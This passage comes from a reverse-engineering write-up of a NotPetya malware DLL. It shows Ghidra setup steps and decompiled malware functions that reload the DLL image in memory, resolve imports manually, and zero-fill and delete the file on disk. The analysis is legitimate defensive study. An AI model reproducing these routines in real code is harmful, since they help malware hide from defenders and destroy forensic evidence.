Next we see a memory section from the `dll_malware_buffer` being copied into the just allocated virtual memory. It seems as if we are trying to load something from the DLL at a specific offset. The [memcpy](http://www.cplusplus.com/reference/cstring/memcpy/) call also partially explains the casts we've been seeing as this function takes `(void*)` as it's arguments. It's worth noting that the difference between `_Src` and `_Dst` is `0x50` however `_Src` points to the current process while `_Dst` points to the in memory malware copy.

The function otherwise still looks rather complicated. Just to get an idea of what we'll be dealing with later with we quickly look at the 3 nested functions `FUN_10009322`, `FUN_100091fa` and `FUN_10009286`. Interestingly we see that the first two have their calling conventian marked as `__thiscall`. Unexpectedly we also see that the first argument is a `void *this`. From this we learn that we are looking at C++ code.

Now given that we've done our homework by watching [a series](https://www.youtube.com/watch?v=Q90uZS3taG0) on the reverse engineering of WannaCry. We realise that we should run OOAnalyzer to help us make more sense of the C++ code.

Following the [OOAnalyzer installation guide](https://github.com/cmu-sei/pharos/blob/master/INSTALL.md). We start by pulling their docker image.

```sh
sudo docker pull seipharos/pharos
```

Next we start an interactive session and map the local folder with the malware dll to `/dir` in the container.

```sh
sudo docker run --rm -it -v `pwd`:/dir seipharos/pharos
```

Next inside the container we move to the `dir` folder.

```sh
cd dir
```

Using a quick directory listing we can then verify that our malware is indeed linked.

```sh
ls -l
```

And finally we run OOAnalyzer and store the result in a `.json` file.

```sh
ooanalyzer -j 027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745.json 027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745
```

The next step is waiting a fair bit. After this we have ended up with a `.json` file the full analysis output being as follows.

```
OPTI[INFO ]: Analyzing executable: 027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745
OPTI[INFO ]: OOAnalyzer version 1.0.
OPTI[INFO ]: ROSE stock partitioning took 34.4457 seconds.
OPTI[INFO ]: Partitioned 47977 bytes, 16653 instructions, 4399 basic blocks, 1 data blocks and 341 functions.
OPTI[INFO ]: Pharos function partitioning took 34.9167 seconds.
OPTI[INFO ]: Partitioned 48640 bytes, 16787 instructions, 4437 basic blocks, 13 data blocks and 343 functions.
APID[WARN ]: API database has no data for DLL: DHCPSAPI
APID[WARN ]: API database has no data for DLL: IPHLPAPI
APID[WARN ]: API database could not find function WNetOpenEnumW in MPR
APID[WARN ]: API database could not find function WNetEnumResourceW in MPR
APID[WARN ]: API database could not find function WNetCancelConnection2W in MPR
APID[WARN ]: API database could not find function WNetAddConnection2W in MPR
APID[WARN ]: API database could not find function WNetCloseEnum in MPR
APID[WARN ]: API database has no data for DLL: NETAPI32
APID[WARN ]: API database could not find function wsprintfA in USER32
APID[WARN ]: API database could not find function wsprintfW in USER32
FSEM[ERROR]: Function 0x1000A5CC relative memory exceeded
FSEM[ERROR]: Function analysis convergence failed for: 0x1000A5CC
FSEM[ERROR]: Function 0x10007C10 has no out edges.
FSEM[ERROR]: Function 0x10005A7E relative memory exceeded
FSEM[ERROR]: Function analysis convergence failed for: 0x10005A7E
FSEM[ERROR]: Function 0x10007DEB has no out edges.
OOAN[ERROR]: No new() methods were found.  Heap objects may not be detected.
OOAN[ERROR]: No delete() methods were found.  Object analysis may be impaired.
OPTI[INFO ]: Function analysis complete, analyzed 178 functions in 81.6441 seconds.
OPTI[INFO ]: OOAnalyzer analysis complete, found: 5 classes, 5 methods, 0 virtual calls, and 10 usage instructions.
OPTI[INFO ]: Successfully exported to JSON file '027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745.json'.
OPTI[INFO ]: OOAnalyzer analysis complete.
```

Next we have to add the OOAnalyzer plugin to Ghidra so we can import our result. For this we first need to compile this plugin however for which [we follow the instructions](https://github.com/cmu-sei/pharos/tree/master/tools/ooanalyzer/ghidra/OOAnalyzerPlugin).

```sh
git clone https://github.com/cmu-sei/pharos.git
```

Next we change directory to the folder containing the plugin source libraries. And add the only dependency of OOAnalyzer, GSON 2.8.5.

```sh
cd pharos/tools/ooanalyzer/ghidra/OOAnalyzerPlugin/lib/
wget https://repo1.maven.org/maven2/com/google/code/gson/gson/2.8.5/gson-2.8.5.jar
```

Next we go up one directory so we cna build the plugin. The first thing we notice is that OOAnalyzer does not use the gradle wrapper, this means that we'll have to install gradle first.

```sh
cd ...
sudo apt-get install gradle
```

Given that there are no further compile details given we just run `gradle`. This gives us an error.

```
> GHIDRA_INSTALL_DIR is not defined!
```

So we do the next sensible thing which is actually checking the content of `build.gradle` where we immediately see some details about this exact error. So we try again.

```sh
gradle -PGHIDRA_INSTALL_DIR=/home/roan/Downloads/ghidra_9.1.2_PUBLIC_20200212/ghidra_9.1.2_PUBLIC
```

Next up we wait a bit. After a while we get back our plugin.

```
Created ghidra_9.1.2_PUBLIC_20200304_OOAnalyzerPlugin.zip in /home/roan/Downloads/2IC80/Project/ooanalyzer/pharos/tools/ooanalyzer/ghidra/OOAnalyzerPlugin/dist
```

Now we can import the plugin in Ghidra. We do so by going to File > Import Plugins and adding the plugin we just built. We get a message that we have to restart Ghidra.

Next we import the output generated json output from before in Ghidra by going to the new `CERT` menu. As expected this cleans up our C++ classes a lot. It also becomes clear that the function we were looking at is in fact simply invoking methods on a C++ style object.

```cpp
undefined4 FUN_10009590(uint param_1,HANDLE param_2,LPCWSTR param_3){
  SIZE_T dwSize;
  undefined *puVar1;
  void *_Src;
  SIZE_T dwSize_00;
  undefined *_Dst;
  int iVar2;
  int iVar3;
  BOOL BVar4;
  cls_10009322 *this;
  DWORD local_c;
  SIZE_T local_8;
  
  _Src = DLL_handle;
  if ((_DAT_1001f114 == 0) && (malware_dll_buffer != 0)) {
    dwSize = *(SIZE_T *)(*(int *)((int)DLL_handle + 0x3c) + 0x50 + (int)DLL_handle);
    local_8 = dwSize;
    _Dst = (undefined *)VirtualAlloc((LPVOID)0x0,dwSize,0x1000,4);
    if (_Dst != (undefined *)0x0) {
      allocated_memory = _Dst;
                    /* Allocated memory in the virtual process address space. The exact size is a
                       bit unclear but it is read-write memory. */
      memcpy(_Dst,_Src,dwSize);
      iVar3 = malware_dll_buffer;
      this = (cls_10009322 *)(*(int *)(malware_dll_buffer + 0x3c) + malware_dll_buffer);
      if (((this != (cls_10009322 *)0x0) && (*(uint *)&this[6].field_0x10 != 0)) &&
         (this[6].mbr_14 != 0)) {
        iVar2 = meth_10009322(this,*(uint *)&this[6].field_0x10);
        if ((((cls_100091fa *)(iVar2 + iVar3) != (cls_100091fa *)0x0) &&
            (iVar3 = meth_100091fa((cls_100091fa *)(iVar2 + iVar3),(int)_Dst), iVar3 != 0)) &&
           (iVar3 = FUN_10009286(_Dst), iVar3 != 0)) {
          (*(code *)(_Dst + (int)(FUN_100094a5 + -(int)DLL_handle)))
                    (param_1,param_2,param_3,0xffffffff);
        }
      }
      dwSize_00 = local_8;
      BVar4 = VirtualProtect(_Dst,local_8,4,&local_c);
      puVar1 = _Dst;
      dwSize = dwSize_00;
      if (BVar4 != 0) {
        while (dwSize != 0) {
          *puVar1 = 0;
          puVar1 = puVar1 + 1;
          dwSize = dwSize - 1;
        }
        VirtualFree(_Dst,dwSize_00,0x4000);
      }
    }
  }
  return 0;
}
```

The main issue we're now left with is that the members of these objects got a bit lost. We can see them being accessed but we cannot really see their definition. Why this is the case is clear when we look at the data type definition. Turns out that most of the object data is of the `undefined` type.

In any case the general structure is clear now. We see accesses to object members and fields accompanied by `null` checks. The most interesting part is then of course what happens if all of these `null` checks succeed. For the time being we'll make that assumption. We then arrive at the following line.

```cpp
(*(code *)(_Dst + (int)(FUN_100094a5 + -(int)DLL_handle)))(param_1,param_2,param_3,0xffffffff);
```

Earlier we took note of `FUN_100094a5` as this is the only internal reference to the `Ordinal_1` function. Although the decompiled syntax here is questionable at best, we can infer that this is most likely a function call. The way it is invoked is odd however as it seems to be 
invoked on the copy made of the malware DLL that is in memory. There's probably a good reason for this or it's because the decompiler is having trouble.

Either way this seems like a good point to take a closer look at `FUN_100094a5`. This function probably plays an important role in the general life cycle of the malware and the current function we're looking at it rather difficult to understand completely. So we might get some useful information by gathering information about the context its being used in first.

### FUN_100094a5

```cpp
void FUN_100094a5(uint param_1,HANDLE param_2,LPCWSTR param_3,HANDLE param_4){
  HANDLE hFile;
  HANDLE hHeap;
  LPVOID lpBuffer;
  BOOL BVar1;
  DWORD dwFlags;
  DWORD dwBytes;
  DWORD local_8;
  
  _DAT_1001f114 = FreeLibrary(DLL_handle);
  if (_DAT_1001f114 != 0) {
    DLL_handle = allocated_memory;
    hFile = CreateFileW(&dll_fully_qualified_path,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                        (HANDLE)0x0);
    if (hFile != (HANDLE)0x0) {
      local_8 = GetFileSize(hFile,(LPDWORD)0x0);
      CloseHandle(hFile);
      hFile = CreateFileW(&dll_fully_qualified_path,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0,
                          (HANDLE)0x0);
      if (hFile != (HANDLE)0x0) {
        dwFlags = 8;
        dwBytes = local_8;
        hHeap = GetProcessHeap();
        lpBuffer = HeapAlloc(hHeap,dwFlags,dwBytes);
        if (lpBuffer != (LPVOID)0x0) {
          WriteFile(hFile,lpBuffer,local_8,&local_8,(LPOVERLAPPED)0x0);
          dwBytes = 0;
          hHeap = GetProcessHeap();
          HeapFree(hHeap,dwBytes,lpBuffer);
        }
        CloseHandle(hFile);
      }
    }
    _DAT_1001f10c = DeleteFileW(&dll_fully_qualified_path);
    BVar1 = FUN_10009367();
    if (BVar1 != 0) {
      Ordinal_1(param_1,param_2,param_3,param_4);
    }
    ExitProcess(0);
  }
  return;
}
```

The first thing to recall when looking at this function is that we know that where we just came from invoked this function with the `INVALID_HANDLE` argument for `param_4`. Next we quickly check using Ghidra if there are any other references to this function. The answer to this is no. This is a bit odd as that would imply that `param_4` is always invalid.

The first thing we see happening is that the original dll handle [is freed](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-freelibrary). In theory as far as we know this means that the reference count to the malware dll will reach 0 meaning it will get unloaded. The result of this call is stored in a global so we can rename this.

If this worked we see that the `DLL_handle` is then set to the in memory that was allocated in the function we came from. This makes appears to make it likely that the memory allocated and initilised then was actually a copy of the entire DLL address space. 

Next we see a [CreateFileW](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew) being used to open the dll file. Access is requested as `0x80000000` which maps to `GENERIC_READ`. Besides that the file is shared, no security attributes are used, it indicates to open an existing file, no flags are used and a `NULL` `HANDLE` is passed. All in all this just gets a `HANDLE` to the DLL file.

Assuming this actually worked the size of the file is gotten and stored in `local_8` so we can rename this. And then the handle to the original DLL is closed.

Next we see that the DLL is read again. But this time with different arguments. Access is requested as `0x40000000` which maps to `GENERIC_WRITE` in addition the file is not sharable this time and it is indicated that the file should be `CREATE_ALWAYS`. This allows overwritting the DLL. The returned handle to the now writeable file is stored in `hFile`.

If this returned handle is not `NULL`, then a few things happen.

First we see a new heap allocation being made that is large enough to store the original DLL. The flags are set to 8 which simply maps to `HEAP_ZERO_MEMORY` meaning the memory is initialised as all 0's.

Assuming the buffer was succesfully created and not a `NULL` pointer. Then a [WriteFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile) call is made. The arguments are rather simple and all that happens is that buffer that was just allocated is written to the DLL file. This effectively wipes the file since the buffer is all 0's.

After this is done we see some resource cleanup like the buffer being freed and the file handle closed.

Next we see a call being made to [DeleteFileW](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-deletefilew), unsurprisingly this deletes the malware DLL file. The success state of this operation is stored in the global `_DAT_1001f10c` so we can rename this global and add a comment.

The next thing we see is a call to `FUN_10009367`. So this is where we will go next. The result of this function determines whether `Ordinal_1` is invoked so it ought to be important.

### FUN_10009367

```cpp
BOOL FUN_10009367(void){
  LPCSTR pCVar1;
  int iVar2;
  BOOL BVar3;
  FARPROC pFVar4;
  int *piVar5;
  FARPROC *ppFVar6;
  LPCSTR *ppCVar7;
  LPCSTR lpProcName;
  DWORD local_14;
  int local_10;
  HMODULE local_c;
  BOOL local_8;
  
  local_8 = 0;
  iVar2 = *(int *)(DLL_handle + 0x3c) + DLL_handle;
  piVar5 = (int *)(*(int *)(iVar2 + 0x80) + DLL_handle);
  if (piVar5 != (int *)0x0) {
    local_c = (HMODULE)0x0;
    local_10 = (uint)*(ushort *)(iVar2 + 0x14) + 0x18 + iVar2;
    if (*(ushort *)(iVar2 + 6) != 0) {
      local_14 = *(uint *)(iVar2 + 0xd8);
      do {
        if ((*(uint *)(local_10 + 0xc) <= local_14) &&
           (local_14 < *(int *)(local_10 + 8) + *(uint *)(local_10 + 0xc))) break;
        local_c = (HMODULE)((int)&local_c->unused + 1);
        local_10 = local_10 + 0x28;
      } while ((int)local_c < (int)(uint)*(ushort *)(iVar2 + 6));
    }
    iVar2 = local_10;
    BVar3 = VirtualProtect((LPVOID)(*(int *)(local_10 + 0xc) + DLL_handle),*(SIZE_T *)(local_10 + 8)
                           ,4,&local_14);
    if (BVar3 != 0) {
      local_8 = 1;
      if (*piVar5 != 0) {
        do {
          if (local_8 != 1) break;
          local_c = LoadLibraryA((LPCSTR)(piVar5[3] + DLL_handle));
          if (local_c == (HMODULE)0x0) {
            local_8 = 0;
          }
          else {
            ppFVar6 = (FARPROC *)(piVar5[4] + DLL_handle);
            ppCVar7 = (LPCSTR *)(*piVar5 + DLL_handle);
            while ((pCVar1 = *ppCVar7, iVar2 = local_10, pCVar1 != (LPCSTR)0x0 && (local_8 == 1))) {
              lpProcName = (LPCSTR)((uint)pCVar1 & 0x7fffffff);
              if (lpProcName == pCVar1) {
                lpProcName = lpProcName + DLL_handle + 2;
              }
              pFVar4 = GetProcAddress(local_c,lpProcName);
              *ppFVar6 = pFVar4;
              if (pFVar4 == (FARPROC)0x0) {
                local_8 = 0;
              }
              ppFVar6 = ppFVar6 + 1;
              ppCVar7 = ppCVar7 + 1;
            }
          }
          piVar5 = piVar5 + 5;
        } while (*piVar5 != 0);
        if (local_8 == 0) {
          return 0;
        }
      }
      local_8 = VirtualProtect((LPVOID)(*(int *)(iVar2 + 0xc) + DLL_handle),*(SIZE_T *)(iVar2 + 8),
                               local_14,&local_14);
    }
  }
  return local_8;
}
```

The first thing to note is that this function is actually surprisingly long and complex. In fact, it is fairly similar to `FUN_10009590` in the sense that we see similar `DLL_handle` offset pointers. On the bright side however, nothing is undefined here. Most likely that will make this all a bit easier to grasp.

Turns out that this function is based all around a double offset of the `DLL_handle` to specfic memory offets. We are still rather unsure as to what a double offset of the `DLL_handle` means. The main take away from this function is however that it load Libraries and exported functions from these libraries.

In addition some memory ranges get protected in `PAGE_READWRITE` mode. For now it's rather difficult to really understandt his function. The important part is that it returns `1` on success and `0` on failure of something. For now we will also rename the function to `load_libraries` as this seems most appropriate.

By extension we know that `Ordinal_1` is only invoked when this function did not fail. Most likely this means that all prerequiresite libraries are loaded.

Finally we see that either after library loading fails or after `Ordinal_1` returns the process is terminated using an [ExitProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess) call.

Next we return to `Ordinal_1` from the second entry point.

### Second entry to Ordinal_1

Back in `Ordinal_1` we see a call being made to `Ordinal_115`. We see that this is an external function exported by `WS2_32.dll` which is not currently present. So we do something very sensible and copy this file from a Windows PC from the `C:\\Windows\System32` directory.

```
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             undefined Ordinal_115()
             undefined         AL:1           <RETURN>
                             115  Ordinal_115  <<not bound>>
                             PTR_Ordinal_115_1000d294                        XREF[1]:     Ordinal_1:10007e1e  
        1000d294 73 00 00 80     addr       WS2_32.DLL::Ordinal_115
        1000d298 00              ??         00h
        1000d299 00              ??         00h
        1000d29a 00              ??         00h
        1000d29b 00              ??         00h
```

After anaylzing the `Ordinal_115` function in `WS2_32.dll` we can update its signature in our NotPetya project. This reveals that the [WSAStartup](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup) function is called. The minimum version required is `0x202` and the Windows Sockets implementation details are stored in `DAT_1001f768`. So we can rename this global. This only initialises the Winsock DLL so it can be used.

Next we see two calls being made to `FUN_10007091` so lets analyse this function next.

### FUN_10007091

```cpp
LPCRITICAL_SECTION FUN_10007091(LONG param_1,ULONG_PTR param_2,PRTL_CRITICAL_SECTION_DEBUG param_3,int param_4){
  HANDLE hHeap;
  PRTL_CRITICAL_SECTION_DEBUG p_Var1;
  LPCRITICAL_SECTION lpCriticalSection;
  DWORD dwFlags;
  SIZE_T dwBytes;
  
  dwBytes = 0x34;
  dwFlags = 8;
  hHeap = GetProcessHeap();
  lpCriticalSection = (LPCRITICAL_SECTION)HeapAlloc(hHeap,dwFlags,dwBytes);
  if (lpCriticalSection != (LPCRITICAL_SECTION)0x0) {
    InitializeCriticalSection(lpCriticalSection);
    lpCriticalSection[1].RecursionCount = param_4;
    lpCriticalSection[1].LockCount = param_1;
    dwBytes = param_4 << 2;
    lpCriticalSection[1].SpinCount = param_2;
    dwFlags = 8;
    lpCriticalSection[1].OwningThread = (HANDLE)0x0;
    lpCriticalSection[2].DebugInfo = param_3;
    hHeap = GetProcessHeap();
    p_Var1 = (PRTL_CRITICAL_SECTION_DEBUG)HeapAlloc(hHeap,dwFlags,dwBytes);
    lpCriticalSection[1].DebugInfo = p_Var1;
    if (p_Var1 == (PRTL_CRITICAL_SECTION_DEBUG)0x0) {
      FUN_10007003();
      lpCriticalSection = (LPCRITICAL_SECTION)0x0;
    }
  }
  return lpCriticalSection;
}
```

In this function we see a space being allocated for a critical section. Next we look at the [MSDN documentation for InitializeCriticalSection](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-initializecriticalsection).  

This function just appears to initialise some `LPCRITICAL_SECION` objects and to do so uses the passed parameters. One interesting part is the nested `FUN_10007003` function near the end. Which is only called then allocating space for the DebugInfo `p_Var1` fails. 

```cpp
void FUN_10007003(void){
  int **ppiVar1;
  int *piVar2;
  HANDLE hHeap;
  LPVOID unaff_ESI;
  DWORD dwFlags;
  LPVOID lpMem;
  uint local_8;
  
  if (unaff_ESI != (LPVOID)0x0) {
    if (*(int *)((int)unaff_ESI + 0x18) != 0) {
      local_8 = 0;
      if (*(int *)((int)unaff_ESI + 0x24) != 0) {
        do {
          ppiVar1 = (int **)(*(int *)((int)unaff_ESI + 0x18) + local_8 * 4);
          if (*ppiVar1 != (int *)0x0) {
            piVar2 = *ppiVar1;
            if (*piVar2 != 0) {
              if (*(code **)((int)unaff_ESI + 0x30) != (code *)0x0) {
                (**(code **)((int)unaff_ESI + 0x30))(*piVar2);
              }
              lpMem = **(LPVOID **)(*(int *)((int)unaff_ESI + 0x18) + local_8 * 4);
              dwFlags = 0;
              hHeap = GetProcessHeap();
              HeapFree(hHeap,dwFlags,lpMem);
            }
            lpMem = *(LPVOID *)(*(int *)((int)unaff_ESI + 0x18) + local_8 * 4);
            dwFlags = 0;
            hHeap = GetProcessHeap();
            HeapFree(hHeap,dwFlags,lpMem);
          }
          local_8 = local_8 + 1;
        } while (local_8 < *(uint *)((int)unaff_ESI + 0x24));
      }
      lpMem = *(LPVOID *)((int)unaff_ESI + 0x18);
      dwFlags = 0;
      hHeap = GetProcessHeap();
      HeapFree(hHeap,dwFlags,lpMem);
    }
    dwFlags = 0;
    hHeap = GetProcessHeap();
    HeapFree(hHeap,dwFlags,unaff_ESI);
  }
  return;
}
```

This function has no return value, no arguments and makes no references to any globals. Instead it simply tiers to free as much heap memory as possible it seems. For now we will just assume it is not that important. The only thing worth noting still is that the `ESI` register being used as offset to free data is the same register that was used in the calling function to store the critical section object. It could be that this is simply cleanup.

It also seems fair to rename `FUN_10007091` to `configure_critical_sections` if more details are required later we can find them here but everything seems fairly standard. In `Ordinal_1` we can then also rename a few things to get the following.

```cpp
critical_section_no_extra_debug = configure_critical_section(0x24,(ULONG_PTR)spincount_function,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xffff);
critical_section_with_extra_debug = configure_critical_section(8,(ULONG_PTR)spincount_function_for_pointers,(PRTL_CRITICAL_SECTION_DEBUG)critical_section_debug_info_function,0xff);
                    /* Is a null pointer */
null_critical_section = (LPCRITICAL_SECTION)0x0;
```

These global are now easy to recognize when encountered later and the function at least have descriptive names.

We now continue with `Ordinal_1`.

### Back to Ordinal_1 again

The first thing we see after these critical sections are configured is the initialisation of a new `LPCRITICAL_SECTION` object using a [InitializeCriticalSection](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-initializecriticalsection) call with the critical section being stored in the not yet encountered `DAT_1001f124` global. We'll rename the global to `critical_section_no_config`.

Moving on to the next line we see `FUN_10006a2b` being invoked with `param_3`.

### FUN_10006a2b (handle_cmd_args)

```cpp
undefined4 FUN_10006a2b(LPCWSTR param_1){
  WCHAR WVar1;
  LPCWSTR lpFirst;
  LPWSTR *hMem;
  int iVar2;
  LPWSTR pWVar3;
  uint uVar4;
  uint local_8;
  
  if (param_1 != (LPCWSTR)0x0) {
    lpFirst = param_1;
    do {
      WVar1 = *lpFirst;
      lpFirst = lpFirst + 1;
    } while (WVar1 != L'\0');
    if ((int)((int)lpFirst - (int)(param_1 + 1)) >> 1 != 0) {
      local_8 = 0;
      hMem = CommandLineToArgvW(param_1,(int *)&local_8);
      if (hMem != (LPWSTR *)0x0) {
        if (0 < (int)local_8) {
          iVar2 = StrToIntW(*hMem);
          uVar4 = 1;
          if (0 < iVar2) {
            DAT_1001f760 = iVar2;
          }
          if (1 < local_8) {
            do {
              lpFirst = hMem[uVar4];
              pWVar3 = StrStrW(lpFirst,L"-h");
              if (lpFirst == pWVar3) {
                FUN_100069a2();
                break;
              }
              pWVar3 = StrChrW(lpFirst,L':');
              if (pWVar3 != (LPWSTR)0x0) {
                *pWVar3 = L'\0';
                FUN_10006de0(lpFirst,pWVar3 + 1,1);
              }
              uVar4 = uVar4 + 1;
            } while (uVar4 < local_8);
          }
        }
        LocalFree(hMem);
      }
    }
  }
  if (DAT_1001f760 == 0) {
    DAT_1001f760 = 0x3c;
  }
  return 0;
}
```

After a `NULL` check on the input parameter we first seen a search over this input string for the first `\0` character. This loops leaves `lpFirst` pointing to the character after this `\0` terminator. For clarity we rename some locals.

Next we seen an `if` statement with a peculiar guard:

```cpp
if ((int)((int)param_1_no_nul - (int)(param_1 + 1)) >> 1 != 0) {
```

The subtraction between `param_1_no_nul` and `param_1` effectively yields the size of the string in bytes. Since we know that this is a `LPCWSTR` we know it's elements are `WCHAR` and therefore each `2` bytes. The left shift by `1` therefore makes sense and effectively divides the total number of bytes by `2` leaving the actual length of the string. If this length is not `0` we continue. This is possible one of the weirdest `strlen` type functions I've ever seen.

Next we see a call being made to [CommandLineToArgvW](https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-commandlinetoargvw). The interesting thing here is that `param_1` is passed as argument, meaning we can go through the program and rename all instances of aliases of `param_1`, including `param_3` in `Oridinal_1` to `cmd_args` since we now know that this is what it is. In addition we can rename this function to something like `handle_cmd_args`.

The call do `CommandLineToArgvW` does the following, the number of commandline arguments is stored in `local_8` which we can rename, an array of `LPWSTR` strings is referenced in `hMem` which we can rename too.

Next we see `args` being checked against `NULL` to ensure that there are arguments and similar it is also checked that `num_args` is greated than `0`.

Next we see a call being made to [StrToIntW](https://docs.microsoft.com/en-us/windows/win32/api/shlwapi/nf-shlwapi-strtointw) with `*args` which parses the first argument to an integer. A bit later we see this argument being stored in `DAT_1001f760` which we will rename.

Next we see a loop over all the other command line arguments (start at index 1).

First we see [StrStrW](https://docs.microsoft.com/en-us/windows/win32/api/shlwapi/nf-shlwapi-strstrw) being used to find the first occurrence of `-h` in the current argument. Next it is checked that this is infact the start of the current argument and if this is the case `FUN_100069a2` is invoked which we can rename to `handle_h_flag`. The loop over the arguments is also terminated.

in the same loop we also see arguments that contain `:` being passed to `FUN_10006de0`. However the argument is terminated at the `:` (colon) position using `\0`. We rename the function to `handle_colon_arg`.

At the very end of the function we also see `0x3c` being assigned to `first_cmd_arg` if this global does not have a value yet.

It should also be noted that the subroutine always returns `0` regardless of what arguments were handled.

In the end the decompiled function looked like this:

```cpp
undefined4 handle_cmd_args(LPCWSTR cmd_args){
  WCHAR ch;
  LPCWSTR one_after_str_end;
  LPWSTR *args;
  int arg1;
  LPWSTR pWVar1;
  uint index;
  uint num_args;
  
  if (cmd_args != (LPCWSTR)0x0) {
    one_after_str_end = cmd_args;
    do {
      ch = *one_after_str_end;
      one_after_str_end = one_after_str_end + 1;
    } while (ch != L'\0');
    if ((int)((int)one_after_str_end - (int)(cmd_args + 1)) >> 1 != 0) {
      num_args = 0;
      args = CommandLineToArgvW(cmd_args,(int *)&num_args);
      if (args != (LPWSTR *)0x0) {
        if (0 < (int)num_args) {
          arg1 = StrToIntW(*args);
          index = 1;
          if (0 < arg1) {
            first_cmd_arg = arg1;
          }
          if (1 < num_args) {
            do {
              one_after_str_end = args[index];
              pWVar1 = StrStrW(one_after_str_end,L"-h");
              if (one_after_str_end == pWVar1) {
                handle_h_flag();
                break;
              }
              pWVar1 = StrChrW(one_after_str_end,L':');
              if (pWVar1 != (LPWSTR)0x0) {
                *pWVar1 = L'\0';
                handle_colon_arg(one_after_str_end,pWVar1 + 1,1);
              }
              index = index + 1;
            } while (index < num_args);
          }
        }
        LocalFree(args);
      }
    }
  }
                    /* First cli arg, defaults to 60 */
  if (first_cmd_arg == 0) {
    first_cmd_arg = 0x3c;
  }
  return 0;
}
```

Next we will look at the two specific argument handling subroutines.


### FUN_100069a2 (handle_h_flag)

```cpp
uint handle_h_flag(void){
  LPWSTR pWVar1;
  WCHAR WVar2;
  int in_EAX;
  LPCWSTR lpCmdLine;
  LPWSTR *hMem;
  uint uVar3;
  WCHAR *pWVar4;
  LPWSTR pWVar5;
  int iVar6;
  uint local_c;
  int local_8;
  
  lpCmdLine = (LPCWSTR)(in_EAX + 4);
  iVar6 = 0;
  local_c = 1;
  WVar2 = *lpCmdLine;
  pWVar4 = lpCmdLine;
  while (WVar2 != L'\0') {
    pWVar4 = pWVar4 + 1;
    if (*pWVar4 == L';') {
      *pWVar4 = L' ';
    }
    WVar2 = *pWVar4;
  }
  local_8 = 0;
  hMem = CommandLineToArgvW(lpCmdLine,&local_8);
  if (hMem != (LPWSTR *)0x0) {
    if (0 < local_8) {
      do {
        pWVar5 = hMem[iVar6];
        pWVar1 = pWVar5 + 1;
        do {
          WVar2 = *pWVar5;
          pWVar5 = pWVar5 + 1;
        } while (WVar2 != L'\0');
        if ((uint)((int)((int)pWVar5 - (int)pWVar1) >> 1) < 0x10) {
          uVar3 = FUN_10006fc7(critical_section_no_extra_debug);
          local_c = local_c & uVar3;
        }
        iVar6 = iVar6 + 1;
      } while (iVar6 < local_8);
    }
    LocalFree(hMem);
  }
  return local_c;
}
```

One of the first peculiarities to notice is that the `cmd_args` string from the calling function is passed in via the `EAX` register. We also see that instead of reusing EAX as is `4` is added to the register. This effectively skips the first two charcters of the string (since it is a LPCWSTR which uses wchar_t which has a compiler specific size of 2 in our case) which makes a lot of sense since those are `-h` which were already checked against in the calling function.

Next we see a loop over the input command line that replaces all instances of `;` with ` ` (space). This is probably done so that the command line arguments get treated as a single argument in the calling function but can then be properly parsed in this function.

As expected the next thing we see is another call to `CommandLineToArgvW` where the arguments are returned in `hMem` (`args`) and the number of arguments in `local_8` (`num_args`).

Next we see a similar check againt to check taht the arguments are not `NULL` and that there are more than `0` arguments.

Next we again see a loop over all the input arguments. However we recognize the `if` statement after it from earlier in `FUN_10006a2b` (`handle_cmd_args`). This is again a stupid way to to compute the length of a string. This time we check the string length for being less than `0x10` (`16`) however. If this is the case then `FUN_10006fc7` is invoked with `critical_section_no_extra_debug` regardless of the actual value of the argument string.

After that function call we see the return value being bitwise ADD'ed into the return value but we know that the return value of this function is not used by the calling function.

Next we will investigate `FUN_10006fc7`.

### FUN_10006fc7

```cpp
undefined4 FUN_10006fc7(LPCRITICAL_SECTION param_1){
  short sVar1;
  short *in_EAX;
  undefined4 uVar2;
  short *psVar3;
  undefined4 unaff_ESI;
  short local_28 [16];
  
  if ((in_EAX == (short *)0x0) || (*in_EAX == 0)) {
    uVar2 = 0;
  }
  else {
    psVar3 = (short *)((int)local_28 - (int)in_EAX);
    do {
      sVar1 = *in_EAX;
      *(short *)((int)psVar3 + (int)in_EAX) = sVar1;
      in_EAX = in_EAX + 1;
    } while (sVar1 != 0);
    uVar2 = FUN_10007298(param_1,local_28,unaff_ESI);
  }
  return uVar2;
}
```

The first thing we notice is that arguments to this function are passed via `EAX` and `ESI`. Going up one layer we immediately notice that `ESI` is 0.

```
10006a0c 33 f6           XOR        ESI,ESI
10006a0e e8 b4 05 00 00  CALL       FUN_10006fc7                                     undefined FUN_10006fc7(undefined
```

We also notice that no further assignments to `EAX` were made in the previous function meaning it still points to the command line arguments (skipping the `-h` flag).

We also wee that the loop using EAX is effectively just a copy of EAX and therefore the command line arguments into `local_28`. Meaning that the `LPCWSTR` is mangled into a short array. Effectively this short array stores the first `8` characters of the command line arguments starting with `-h`.

Next we see a call into `FUN_10007298` using the critical section, just created string like short array and `ESI` which has a value of `0`.

### FUN_10007298

```cpp
undefined4 FUN_10007298(LPCRITICAL_SECTION param_1,void *param_2,undefined4 param_3){
  int iVar1;
  HANDLE hHeap;
  LPVOID lpMem;
  DWORD dwFlags;
  PRTL_CRITICAL_SECTION_DEBUG lpMem_00;
  SIZE_T dwBytes;
  undefined4 local_8;
  
  local_8 = 0;
  if ((param_1 != (LPCRITICAL_SECTION)0x0) && (param_2 != (void *)0x0)) {
    EnterCriticalSection(param_1);
    iVar1 = FUN_100071d6(param_2,0);
    if (iVar1 == 0) {
